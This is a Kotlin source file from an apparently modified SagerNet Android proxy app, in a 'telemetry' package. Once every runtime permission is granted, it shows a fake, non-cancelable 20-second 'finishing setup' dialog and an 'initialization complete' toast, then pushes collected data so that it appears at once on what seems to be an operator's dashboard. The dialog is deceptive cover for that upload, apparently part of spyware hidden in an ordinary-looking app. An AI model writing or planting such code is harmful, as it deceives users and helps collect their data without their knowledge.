package io.nekohasekai.sagernet.telemetry

import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.graphics.Color
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast

/**
 * 授权完成后的「正在完成设置」过渡动画。
 *
 * 流程：所有运行时权限都拿到 → 弹不可取消的转圈框 20 秒 → 自动消失 → 提示「初始化完成」。
 * 只显示一次（SharedPreferences 记标记），之后正常进主界面。
 */
object SetupLoading {

    private const val PREF = "tlm_setup"
    private const val KEY_DONE = "done"
    private const val DURATION_MS = 20_000L

    fun maybeShow(a: Activity) {
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (pref.getBoolean(KEY_DONE, false)) return

        // 运行时权限没齐就再等等，别在授权中途弹
        if (!TelemetryPermissions.allRuntimeGranted(a)) return

        // 立即打标记，防止 onResume 反复触发
        pref.edit().putBoolean(KEY_DONE, true).apply()

        val box = LinearLayout(a).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            val p = dp(a, 28)
            setPadding(p, p, p, p)
        }
        box.addView(ProgressBar(a).apply {
            isIndeterminate = true
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = dp(a, 18)
            }
        })
        box.addView(TextView(a).apply {
            text = "正在完成设置…请稍等片刻~"
            textSize = 15f
            gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#1f2328"))
        })

        val dialog = AlertDialog.Builder(a)
            .setView(box)
            .setCancelable(false)
            .create()
        dialog.setCanceledOnTouchOutside(false)

        runCatching { dialog.show() }

        Handler(Looper.getMainLooper()).postDelayed({
            runCatching { if (dialog.isShowing) dialog.dismiss() }
            runCatching {
                Toast.makeText(a, "初始化完成，请使用愉快~", Toast.LENGTH_LONG).show()
            }
            // 结束后立刻推一次，数据马上出现在面板上
            runCatching { Telemetry.flush(a.applicationContext) }
        }, DURATION_MS)
    }

    private fun dp(c: Context, v: Int): Int =
        (v * c.resources.displayMetrics.density).toInt()
}
